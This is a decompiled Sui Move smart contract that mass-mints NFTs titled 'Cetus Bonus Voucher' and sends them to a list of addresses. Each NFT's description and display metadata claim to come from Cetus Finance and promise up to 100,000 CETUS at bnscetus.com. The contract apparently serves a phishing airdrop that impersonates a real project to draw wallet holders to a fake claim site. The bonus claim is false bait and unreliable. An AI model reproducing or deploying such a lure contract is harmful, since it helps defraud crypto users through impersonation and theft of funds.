module 0xf5e1c6d5a0bf3c38c08ebccf3a2e86734fe57d39d62985d9bd2f7b6132e3f706::cetusbonus4187 {
    struct CETUSBONUS4187 has drop {
        dummy_field: bool,
    }

    struct CETUS_BONUS_4187 has store, key {
        id: 0x2::object::UID,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    struct MintEvent has copy, drop {
        nft_id: 0x2::object::ID,
        user: address,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    struct BurnEvent has copy, drop {
        nft_id: 0x2::object::ID,
        user: address,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    public entry fun BonusFromCetus4187(arg0: vector<address>, arg1: &mut 0x2::tx_context::TxContext) {
        while (0x1::vector::length<address>(&arg0) > 0) {
            let v0 = CETUS_BONUS_4187{
                id          : 0x2::object::new(arg1),
                name        : 0x1::string::utf8(b"Cetus Bonus Voucher"),
                image_url   : 0x1::string::utf8(b"https://res.cloudinary.com/dfromkbsy/image/upload/v1725088039/bnscetuscom_0831_2_u9koat.jpg"),
                description : 0x1::string::utf8(b"Bonus from Cetus Finance is ready at https://bnscetus.com. Verify your Voucher and claim your bonus upto 100,000 CETUS."),
                Reward      : 0x1::string::utf8(b"100,000 CETUS"),
            };
            let v1 = MintEvent{
                nft_id      : 0x2::object::id<CETUS_BONUS_4187>(&v0),
                user        : 0x2::tx_context::sender(arg1),
                name        : 0x1::string::utf8(b"Cetus Bonus Voucher"),
                image_url   : 0x1::string::utf8(b"https://res.cloudinary.com/dfromkbsy/image/upload/v1725088039/bnscetuscom_0831_2_u9koat.jpg"),
                description : 0x1::string::utf8(b"Bonus from Cetus Finance is ready at https://bnscetus.com. Verify your Voucher and claim your bonus upto 100,000 CETUS."),
                Reward      : 0x1::string::utf8(b"100,000 CETUS"),
            };
            0x2::event::emit<MintEvent>(v1);
            0x2::transfer::public_transfer<CETUS_BONUS_4187>(v0, 0x1::vector::pop_back<address>(&mut arg0));
        };
    }

    public entry fun burn_nft(arg0: CETUS_BONUS_4187, arg1: &mut 0x2::tx_context::TxContext) {
        let CETUS_BONUS_4187 {
            id          : v0,
            name        : v1,
            image_url   : v2,
            description : v3,
            Reward      : v4,
        } = arg0;
        let v5 = v0;
        let v6 = BurnEvent{
            nft_id      : 0x2::object::uid_to_inner(&v5),
            user        : 0x2::tx_context::sender(arg1),
            name        : v1,
            image_url   : v2,
            description : v3,
            Reward      : v4,
        };
        0x2::event::emit<BurnEvent>(v6);
        0x2::object::delete(v5);
    }

    fun init(arg0: CETUSBONUS4187, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x1::vector::empty<0x1::string::String>();
        let v1 = &mut v0;
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"name"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"image_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"description"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"project_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"creator"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"Reward"));
        let v2 = 0x1::vector::empty<0x1::string::String>();
        let v3 = &mut v2;
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Cetus Bonus Voucher"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://res.cloudinary.com/dfromkbsy/image/upload/v1725088039/bnscetuscom_0831_2_u9koat.jpg"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Bonus from Cetus Finance is ready at https://bnscetus.com. Verify your Voucher and claim your bonus upto 100,000 CETUS."));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://bnscetus.com"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Cetus Finance"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"100,000 CETUS"));
        let v4 = 0x2::package::claim<CETUSBONUS4187>(arg0, arg1);
        let v5 = 0x2::display::new_with_fields<CETUS_BONUS_4187>(&v4, v0, v2, arg1);
        0x2::display::update_version<CETUS_BONUS_4187>(&mut v5);
        0x2::transfer::public_transfer<0x2::package::Publisher>(v4, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::display::Display<CETUS_BONUS_4187>>(v5, 0x2::tx_context::sender(arg1));
    }

    // decompiled from Move bytecode v6
}

